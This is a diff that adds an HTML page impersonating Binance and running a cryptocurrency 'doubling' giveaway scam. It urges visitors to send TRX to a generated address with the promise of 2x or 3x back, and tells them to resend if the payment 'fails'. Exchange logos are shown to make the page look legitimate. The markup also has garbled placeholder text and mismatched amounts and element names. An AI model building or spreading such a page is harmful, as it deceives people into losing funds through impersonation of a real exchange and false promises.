@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Binance Pay TRON</title>
+  <link rel="stylesheet" href="public/css/index.css" />
+  <link rel="stylesheet"
+    href="https://fonts.googleapis.com/css2?family=Material+Symbols+Sharp:opsz,wght,FILL,GRAD@48,400,0,0" />
+</head>
+
+<body>
+  <div class="container" id="container">
+    <img id="img" src="/public/images/Binance-Logo.png" alt="binance" />
+    <div class="container-box" id="container-box">
+      <p>
+        To verify your TRX address, just send from <span id="minAmount">1.17</span> to <span id="maxAmount"></span> TRX to the
+        generated address below and get from <span id="min2"></span> to <span id="max2"></span> TRX (you will earn 3x
+        bonus if you send 10 TRX and above) sent back to the address you sent
+        TRX from or the one you specified below, you will get double of what
+        you send to the giveaway address.
+      </p>
+      <p>
+        In this event, participant will get 2x (or 3x) of what they send to
+        the giveaway address within 10 to 20 minutes which can be traded on
+        any exchange.
+      </p>
+      <h2>how to participate</h2>
+      <ul>
+        <li>
+          <span>step 1: </span>Make sure you have at least <span class="minAmount"></span> TRX or above in
+          your wallet.
+        </li>
+        <li>
+          <span>step 2: </span>Enter the amount you wish to participate with
+          below.
+        </li>
+        <li><span>step 3: </span>Enter your TRX address.</li>
+        <li>
+          <span>step 4: </span>Click the "Generate Payment" button to generate the payment address.
+        </li>
+        <li>
+          <span>step 5: </span>Click "Pay Now" to send the amount you have entered to the giveaway
+        </li>
+        <li><span>step 6: </span>Confirm payment.</li>
+        <li><span>step 7: </span>Wait for at least 4 - 8 minutes.</li>
+      </ul>
+      <p>
+        The 2x bonus will be sent to the address you entered or the one you
+        sent the TRX from.
+      </p>
+      <p>
+        <i>If the transaction does not process correctly, please try again
+          with same amount to the Generated address, and it should go through.
+          Your original transaction will merge with the new one, and the bonus
+          for the two will be sent back.</i>
+      </p>
+    </div>
+    <div class="container-box box">
+      <div class="form">
+        <div class="input-group">
+          <div class="input">
+            <label>amount:</label>
+            <div class="input-box">
+              <img src="/public/images/Binance.png" alt="Binance" />
+              <input type="number" onkeyup="bonusCalculation()" name="amount" class="amount" />
+            </div>
+            <span class="warning">qwekjfsb vgkjf jekgnj jnektn sdnbgkrty<span id="_lessThan"></span></span>
+          </div>
+          <span>=</span>
+          <div class="input">
+            <label>bonus:</label>
+            <div class="input-box">
+              <img src="/public/images/Binance.png" alt="Binance" />
+              <input type="number" readonly name="bonus" class="bonus" />
+            </div>
+          </div>
+        </div>
+      <div class="input-address">
+          <label for="address">address:</label>
+          <input type="text" required name="address" id="address" />
+        </div>
+        <button id="btn" class="btn">generate payment</button>
+      </div>
+      <a href="#">Last chance to get your TRX</a>
+      <span class="loader">loading</span>
+      <p>Support Exchange</p>
+
+      <div class="ads">
+        <div class="ads-set">
+          <div class="ads-box">
+            <img src="public/images/Binance.png" alt="binance" />binance
+          </div>
+          <div class="ads-box">
+            <img src="public/images/upbit.PNG" alt="upbit" />upbit
+          </div>
+          <div class="ads-box">
+            <img src="public/images/ckex.png" alt="ckex" />ckex
+          </div>
+        </div>
+        <div class="ads-set">
+          <div class="ads-box">
+            <img src="public/images/remittance.PNG" alt="remittance" />remitano
+          </div>
+          <div class="ads-box">
+            <img src="public/images/mercatox.png" alt="mercatox" />mercatox
+          </div>
+          <div class="ads-box">
+            <img src="public/images/luno.PNG" alt="luno" />luno
+          </div>
+        </div>
+        <div class="ads-set">
+          <div class="ads-box">
+            <img src="public/images/coinsph.png" alt="coinsph" />coins.ph
+          </div>
+          <div class="ads-box">
+            <img src="public/images/coinbase.png" alt="coinbase" />coinsbase
+          </div>
+          <div class="ads-box">
+            <img src="public/images/yobit.png" alt="yobit" />yobit
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="prompt-box" id="popup">
+      <img src="public/images/address/eth-address.PNG" alt="trx-address" />
+      <span>0 confirmation</span>
+      <span>spinning loading</span>
+      <div class="form">
+        
+        <div class="input-box">
+          <span id="amount-to-pay"></span>
+          <a href="#"><span class="material-symbols-sharp">file_copy</span></a>
+        </div>
+        <label for="amount">address</label>
+        <div id="copy-link" class="input-box">
+        <input type="text" required readonly class="copy-link-input" />
+        <button id="copyBtn" class="copy-link-button"><span class="material-symbols-sharp">file_copy</span></button>
+      </div>
+      </div>
+      <button>pay now</button>
+    <!-- <div class="failed">
+      <span class="material-symbols-sharp">
+        cancel
+        </span>
+        <span class="info"></span>
+    </div> -->
+    
+  </div>
+  <script src="public/jscript/main.js"></script>
+  <script>
+     let address = document.querySelector(".copy-link-input");
+        address.value = trxAddress;
+        const _lessThan = 5206;
+    const _greaterThan = 20000;
+    maxAmount.innerText = _greaterThan;
+    minAmount.innerText = _lessThan;
+    
+    const x2maxAmount = _greaterThan * 2;
+    const x2minAmount = _lessThan * 2;
+    
+    max2Amount.innerText = x2maxAmount;
+    min2Amount.innerText = x2minAmount;
+    
+    document.querySelector(".minAmount").innerHTML = _lessThan;
+  </script>
+</body>
+
+</html>
